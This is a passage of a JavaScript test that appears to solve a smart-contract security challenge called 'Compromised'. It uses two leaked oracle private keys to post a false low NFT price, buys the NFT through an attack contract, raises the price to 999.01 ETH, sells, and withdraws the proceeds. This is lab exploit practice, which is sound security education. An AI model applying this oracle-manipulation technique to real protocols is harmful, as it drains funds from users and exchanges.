...
describe("Compromised challenge", function () {
  ...
  it("Execution", async function () {
    ...
    const oracleAddress1 =
      "0xc678ef1aa456da65c6fc5861d44892cdfac0c6c8c2560bf0c9fbcdae2f4735a9";
    const oracleAddress2 =
      "0x208242c40acdfa9ed889e685c23547acbed9befc60371e9875fbcd736340bb48";

    const oracleWallet1 = new ethers.Wallet(oracleAddress1, ethers.provider);
    const oracleWallet2 = new ethers.Wallet(oracleAddress2, ethers.provider);

    await oracle
      .connect(oracleWallet1)
      .postPrice("DVNFT", ethers.utils.parseEther("0.01"));
    await oracle
      .connect(oracleWallet2)
      .postPrice("DVNFT", ethers.utils.parseEther("0.01"));

    attackContract.connect(player);
    let value = await attackContract.getPrice();

    const sendEth = await attackContract.deposit({
      value: ethers.utils.parseEther("0.1"),
    });

    const buyNft = await attackContract.buy();
    await buyNft.wait(1);

    await oracle
      .connect(oracleWallet1)
      .postPrice("DVNFT", ethers.utils.parseEther("999.01"));
    await oracle
      .connect(oracleWallet2)
      .postPrice("DVNFT", ethers.utils.parseEther("999.01"));

    value = await attackContract.getPrice();

    const getId = await attackContract.getId();

    const sellNft = await attackContract.sell();
    await sellNft.wait(1);

    await attackContract.withdraw(player.address);
